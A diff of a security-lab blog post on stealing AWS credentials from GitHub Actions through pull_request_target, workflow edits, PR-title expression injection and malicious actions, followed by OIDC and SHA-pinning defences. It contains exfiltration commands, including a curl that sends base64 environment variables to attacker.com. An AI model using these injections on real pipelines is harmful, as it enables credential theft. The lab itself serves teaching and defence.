@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Lab — CI/CD Pipeline Attack: GitHub Actions Secret Theft and OIDC Hardening"
+title: "Lab: CI/CD Pipeline Attack: GitHub Actions Secret Theft and OIDC Hardening"
 date: 2026-06-26T10:00:00
 categories:
   - AWS Security Labs
@@ -16,7 +16,7 @@ tags:
   - cloud-attack
   - lab
 author: muhammed
-description: A hands-on lab demonstrating four ways to steal AWS credentials from GitHub Actions pipelines — pull_request_target exploitation, workflow injection, command injection, and malicious actions — then replacing all long-lived keys with OIDC to eliminate the attack surface entirely.
+description: A hands-on lab demonstrating four ways to steal AWS credentials from GitHub Actions pipelines - pull_request_target exploitation, workflow injection, command injection, and malicious actions - then replacing all long-lived keys with OIDC to eliminate the attack surface entirely.
 toc: true
 pin: false
 math: false
@@ -26,7 +26,7 @@ image:
 
 ## Objective
 
-Steal AWS credentials stored as GitHub Actions secrets using four different attack techniques — all from a normal-looking GitHub pull request.
+Steal AWS credentials stored as GitHub Actions secrets using four different attack techniques - all from a normal-looking GitHub pull request.
 Then replace every long-lived key with OIDC federation so there are no secrets left to steal.
 
 **Use a repository and AWS account you own.**
@@ -38,7 +38,7 @@ Then replace every long-lived key with OIDC federation so there are no secrets l
 The first three labs required you to exploit a running server.
 This lab requires only a GitHub account and the ability to open a pull request.
 
-CI/CD pipelines are trusted with the highest-privilege credentials in your environment — production deployment keys, container registry passwords, Terraform state access.
+CI/CD pipelines are trusted with the highest-privilege credentials in your environment - production deployment keys, container registry passwords, Terraform state access.
 They run code from pull requests.
 And pull requests come from anyone.
 
@@ -54,7 +54,7 @@ Codecov (2021), Dependency Confusion (2021), and dozens of smaller incidents all
 
 ## What You Will Learn
 
-- How GitHub Actions secrets are exposed to workflow runs — and when they are not
+- How GitHub Actions secrets are exposed to workflow runs - and when they are not
 - Four distinct attack paths that extract secrets from pipelines
 - How `pull_request_target` creates a privileged execution context that most developers don't understand
 - Why OIDC is fundamentally safer than stored secrets
@@ -76,16 +76,16 @@ GitHub Secrets:
     AWS_SECRET_ACCESS_KEY → stored long-lived IAM key
 
 AWS Account:
-    IAM User: github-actions-deployer (AdministratorAccess — overprivileged)
+    IAM User: github-actions-deployer (AdministratorAccess - overprivileged)
     S3 Bucket: production-deploy-bucket
     ECS Service: production-app
 ```
 
 ---
 
-## Phase 0 — Setup
+## Phase 0: Setup
 
-### Step 0.1 — Create the IAM User with Long-Lived Keys
+### Step 0.1: Create the IAM User with Long-Lived Keys
 
 ```bash
 aws iam create-user --user-name github-actions-deployer
@@ -100,7 +100,7 @@ aws iam create-access-key --user-name github-actions-deployer
 
 > 📸 **SCREENSHOT:** IAM console showing github-actions-deployer user with AdministratorAccess and an active access key
 
-### Step 0.2 — Create a GitHub Repository
+### Step 0.2: Create a GitHub Repository
 
 Create a new public GitHub repository called `cicd-lab-target`.
 Add the AWS credentials as GitHub secrets:
@@ -117,7 +117,7 @@ Value: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
 
 > 📸 **SCREENSHOT:** GitHub repository Secrets page showing AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY configured
 
-### Step 0.3 — Add the Vulnerable Workflows
+### Step 0.3: Add the Vulnerable Workflows
 
 Create `.github/workflows/deploy.yml`:
 
@@ -149,13 +149,13 @@ jobs:
         run: aws s3 sync ./dist s3://production-deploy-bucket
 ```
 
-Create `.github/workflows/pr-check.yml` — the deliberately misconfigured one:
+Create `.github/workflows/pr-check.yml` - the deliberately misconfigured one:
 
 ```yaml
 name: PR Check
 
 # VULNERABLE: pull_request_target runs in the context of the BASE branch
-# with access to secrets — even for PRs from forks
+# with access to secrets: even for PRs from forks
 on:
   pull_request_target:
     types: [opened, synchronize]
@@ -188,7 +188,7 @@ Push both files to the `main` branch of the repo.
 
 ---
 
-## Attack 1 — `pull_request_target` Exploitation
+## Attack 1: `pull_request_target` Exploitation
 
 ### Why This Is Dangerous
 
@@ -200,7 +200,7 @@ GitHub has two pull request triggers:
 | `pull_request_target` | Base branch | **Yes** | Dangerous if PR code is checked out |
 
 `pull_request_target` was designed for workflows that need secrets to post comments or update PR status.
-The danger is when you checkout the PR's code AND have secrets — you are running the attacker's code with your production credentials.
+The danger is when you checkout the PR's code AND have secrets - you are running the attacker's code with your production credentials.
 
 ### The Attack
 
@@ -230,9 +230,9 @@ exit 0
 Open a pull request from the fork to the original repo.
 
 When the PR is opened, `pr-check.yml` triggers:
-1. It runs in the base branch context — has secrets
-2. It checks out your PR code — your modified `check.sh`
-3. It runs `bash ./scripts/check.sh` — which is now your attacker script
+1. It runs in the base branch context - has secrets
+2. It checks out your PR code - your modified `check.sh`
+3. It runs `bash ./scripts/check.sh` - which is now your attacker script
 4. Your script receives `$AWS_ACCESS_KEY_ID` and `$AWS_SECRET_ACCESS_KEY` as environment variables
 5. The credentials are POSTed to your server
 
@@ -258,7 +258,7 @@ Credentials used from an unexpected IP (attacker's server) triggers anomalous be
 
 ---
 
-## Attack 2 — Workflow File Modification via PR
+## Attack 2: Workflow File Modification via PR
 
 ### How It Works
 
@@ -290,7 +290,7 @@ jobs:
           aws-secret-access-key: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
           aws-region: eu-west-1
 
-      # Added by attacker — looks like a debug step
+      # Added by attacker - looks like a debug step
       - name: Debug environment
         run: |
           echo "Debugging pipeline configuration..."
@@ -320,17 +320,17 @@ GitHub allows this via branch protection rules → "Require approval from code o
 
 ---
 
-## Attack 3 — Expression Injection via PR Title
+## Attack 3: Expression Injection via PR Title
 
 ### How It Works
 
 GitHub Actions expressions `${{ }}` are evaluated before the shell runs the command.
-If an expression includes user-controlled input — like a PR title, branch name, or commit message — the attacker can inject shell commands.
+If an expression includes user-controlled input - like a PR title, branch name, or commit message - the attacker can inject shell commands.
 
 Add this step to a workflow:
 
 ```yaml
-# VULNERABLE — interpolates PR title directly into shell
+# VULNERABLE: interpolates PR title directly into shell
 - name: Notify about PR
   run: |
     echo "Processing PR: ${{ github.event.pull_request.title }}"
@@ -353,14 +353,14 @@ When the workflow runs, the expression is substituted before the shell sees it:
 echo "Processing PR: Fix bug"; curl https://attacker.com/steal -d "$(env | base64)"; echo ""
 ```
 
-The injected `curl` command runs in the same environment that has `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` set — they are in `env` output.
+The injected `curl` command runs in the same environment that has `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` set - they are in `env` output.
 
-> 📸 **SCREENSHOT:** GitHub Actions log showing the injected command executing and the curl running — with environment variables being sent
+> 📸 **SCREENSHOT:** GitHub Actions log showing the injected command executing and the curl running - with environment variables being sent
 
-**Fix — use an environment variable as an intermediary:**
+**Fix - use an environment variable as an intermediary:**
 
 ```yaml
-# SAFE — expression assigned to env var first, shell sees it as a literal string
+# SAFE: expression assigned to env var first, shell sees it as a literal string
 - name: Notify about PR
   env:
     PR_TITLE: ${{ github.event.pull_request.title }}
@@ -370,7 +370,7 @@ The injected `curl` command runs in the same environment that has `AWS_ACCESS_KE
 ```
 
 When `${{ }}` is assigned to an `env:` key, the value is passed as a shell variable.
-The shell does not re-evaluate it as a command — injection is impossible.
+The shell does not re-evaluate it as a command - injection is impossible.
 
 **Every place you use `${{ github.event.* }}` directly in a `run:` block is an injection risk.**
 Safe inputs: `github.sha`, `github.run_id`, `github.repository`.
@@ -378,23 +378,23 @@ Dangerous inputs: `github.event.pull_request.title`, `github.event.pull_request.
 
 ---
 
-## Attack 4 — Malicious Third-Party Action
+## Attack 4: Malicious Third-Party Action
 
 ### How It Works
 
 GitHub Actions steps reference actions by `owner/repo@version`.
-If you pin to a tag (`@v3`) instead of a commit SHA, the action owner can move the tag to a different commit — silently changing what code runs in your pipeline.
+If you pin to a tag (`@v3`) instead of a commit SHA, the action owner can move the tag to a different commit - silently changing what code runs in your pipeline.
 
-This is not theoretical — the `reviewdog/action-setup@v1` tag was moved to a malicious commit in 2023 that exfiltrated secrets.
+This is not theoretical - the `reviewdog/action-setup@v1` tag was moved to a malicious commit in 2023 that exfiltrated secrets.
 
 ```yaml
-# VULNERABLE — tag can be moved by the action owner
+# VULNERABLE: tag can be moved by the action owner
 - uses: some-action/do-thing@v2
 
-# VULNERABLE — branch can be modified
+# VULNERABLE: branch can be modified
 - uses: some-action/do-thing@main
 
-# SAFE — commit SHA is immutable
+# SAFE: commit SHA is immutable
 - uses: some-action/do-thing@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2
 ```
 
@@ -423,14 +423,14 @@ If your target repo uses `your-username/evil-action@v1` and you move the `v1` ta
 
 > 📸 **SCREENSHOT:** GitHub showing the evil-action repository with the malicious action.yml, and the workflow using it with a tag reference
 
-**Fix — pin every action to a full commit SHA:**
+**Fix - pin every action to a full commit SHA:**
 
 ```yaml
 # Before (vulnerable)
 - uses: actions/checkout@v3
 - uses: aws-actions/configure-aws-credentials@v2
 
-# After (safe — SHA pinning)
+# After (safe: SHA pinning)
 - uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9        # v3.5.3
 - uses: aws-actions/configure-aws-credentials@5fd3084fc36e372ff1beb9153e7ca6c60a21041e  # v2.2.0
 ```
@@ -449,10 +449,10 @@ updates:
 
 ---
 
-## Defense — Replace All Long-Lived Keys with OIDC
+## Defense: Replace All Long-Lived Keys with OIDC
 
 All four attacks above steal `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`.
-OIDC eliminates these credentials entirely — there is nothing to steal.
+OIDC eliminates these credentials entirely - there is nothing to steal.
 
 ### How OIDC Works
 
@@ -479,13 +479,13 @@ AWS STS
     ▼
 GitHub Actions runner uses temporary credentials
     │
-    │  6. Credentials expire automatically — no revocation needed
+    │  6. Credentials expire automatically - no revocation needed
 ```
 
 No stored secrets anywhere.
 Even if an attacker intercepts the OIDC token, it is valid for one run only and cannot be reused outside the STS exchange.
 
-### Step 1 — Create the IAM OIDC Provider
+### Step 1: Create the IAM OIDC Provider
 
 ```bash
 # Get GitHub's OIDC thumbprint
@@ -504,7 +504,7 @@ aws iam create-open-id-connect-provider \
   --thumbprint-list $THUMBPRINT
 ```
 
-### Step 2 — Create the IAM Role for GitHub Actions
+### Step 2: Create the IAM Role for GitHub Actions
 
 The trust policy is where you restrict which repos, branches, and environments can assume this role.
 
@@ -547,9 +547,9 @@ aws iam attach-role-policy \
 The `sub` condition locks the role to:
 - Only the `cicd-lab-target` repo in your org
 - Only the `main` branch OR the `production` environment
-- Pull requests from forks cannot assume this role — their `sub` claim is different
+- Pull requests from forks cannot assume this role - their `sub` claim is different
 
-### Step 3 — Update the Workflow to Use OIDC
+### Step 3: Update the Workflow to Use OIDC
 
 Delete `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY` from GitHub Secrets.
 Update the workflow:
@@ -578,7 +578,7 @@ jobs:
         with:
           role-to-assume: arn:aws:iam::ACCOUNT_ID:role/github-actions-deploy-role
           aws-region: eu-west-1
-          # No access-key-id or secret-access-key — OIDC handles everything
+          # No access-key-id or secret-access-key - OIDC handles everything
 
       - name: Verify identity
         run: aws sts get-caller-identity
@@ -589,9 +589,9 @@ jobs:
 
 > 📸 **SCREENSHOT:** GitHub Actions run showing the OIDC authentication step succeeding with "Assuming role with OIDC" in the logs, and `aws sts get-caller-identity` showing the assumed role
 
-### Step 4 — Verify the Attack No Longer Works
+### Step 4: Verify the Attack No Longer Works
 
-Repeat Attack 1 — open a PR from a fork with a malicious `check.sh`:
+Repeat Attack 1 - open a PR from a fork with a malicious `check.sh`:
 
 ```bash
 # Attacker's check.sh
@@ -606,15 +606,15 @@ AWS_ACCESS_KEY_ID=
 AWS_SECRET_ACCESS_KEY=
 ```
 
-Both variables are empty — they no longer exist.
+Both variables are empty - they no longer exist.
 The OIDC credentials (`AWS_SESSION_TOKEN`) are present but scoped to this exact run and expire in one hour.
 There is nothing persistent to steal.
 
-> 📸 **SCREENSHOT:** GitHub Actions log showing empty AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY — proof that OIDC has eliminated the attack surface
+> 📸 **SCREENSHOT:** GitHub Actions log showing empty AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY - proof that OIDC has eliminated the attack surface
 
 ---
 
-## Defense Stack — Hardened Workflow Template
+## Defense Stack: Hardened Workflow Template
 
 ```yaml
 name: Secure Deploy Pipeline
@@ -624,7 +624,7 @@ on:
     branches: [main]
   pull_request:
     branches: [main]
-    # NOTE: pull_request (not pull_request_target) — no secrets for fork PRs
+    # NOTE: pull_request (not pull_request_target) - no secrets for fork PRs
 
 permissions:
   id-token: write
@@ -634,11 +634,11 @@ permissions:
 jobs:
   security-checks:
     runs-on: ubuntu-latest
-    # No AWS credentials for PR checks — only for deployments
+    # No AWS credentials for PR checks - only for deployments
     steps:
       - uses: actions/checkout@c85c95e3d7251135ab7dc9ce3241c5835cc595a9  # SHA pinned
 
-      # Use env: for all user-controlled input — never ${{ github.event.* }} in run:
+      # Use env: for all user-controlled input - never ${{ github.event.* }} in run:
       - name: Run checks
         env:
           PR_TITLE: ${{ github.event.pull_request.title }}
@@ -669,7 +669,7 @@ jobs:
 
 ---
 
-## Detection — What Catches Each Attack
+## Detection: What Catches Each Attack
 
 ### GuardDuty
 
@@ -711,7 +711,7 @@ action:workflows.run_triggered_from_fork
 
 ---
 
-## Full Comparison — Before and After OIDC
+## Full Comparison: Before and After OIDC
 
 | | Long-lived keys | OIDC |
 |---|----------------|------|
@@ -719,7 +719,7 @@ action:workflows.run_triggered_from_fork
 | **Credential lifetime** | Permanent until manually rotated | 1 hour maximum |
 | **If stolen** | Attacker has permanent access | Attacker has 1-hour access, cannot reuse |
 | **fork PR access** | Keys present in `pull_request_target` context | No keys to expose |
-| **Rotation required** | Yes — manual, often forgotten | No — automatic per run |
+| **Rotation required** | Yes - manual, often forgotten | No - automatic per run |
 | **Blast radius if repo compromised** | Full account access until keys revoked | Current run only |
 | **Privilege scope** | Whatever the IAM user has | Locked by trust policy to specific repo/branch/environment |
 
@@ -727,11 +727,11 @@ action:workflows.run_triggered_from_fork
 
 ## Key Takeaways
 
-- `pull_request_target` is the most common misconfiguration in GitHub Actions — it gives fork PRs the same secret access as your main branch
+- `pull_request_target` is the most common misconfiguration in GitHub Actions - it gives fork PRs the same secret access as your main branch
 - Expression injection via `${{ github.event.pull_request.title }}` in `run:` blocks is an easy mistake that hands attackers a shell with your credentials
-- OIDC eliminates the entire attack surface by removing stored credentials — there is nothing to steal because credentials are generated per-run and expire in one hour
-- Pin actions to commit SHAs — tags are mutable and have been weaponized in real supply chain attacks
-- The `sub` claim in the OIDC trust policy is your access control — lock it to specific repos, branches, and environments, never use a wildcard
+- OIDC eliminates the entire attack surface by removing stored credentials - there is nothing to steal because credentials are generated per-run and expire in one hour
+- Pin actions to commit SHAs - tags are mutable and have been weaponized in real supply chain attacks
+- The `sub` claim in the OIDC trust policy is your access control - lock it to specific repos, branches, and environments, never use a wildcard
 
 ---
 
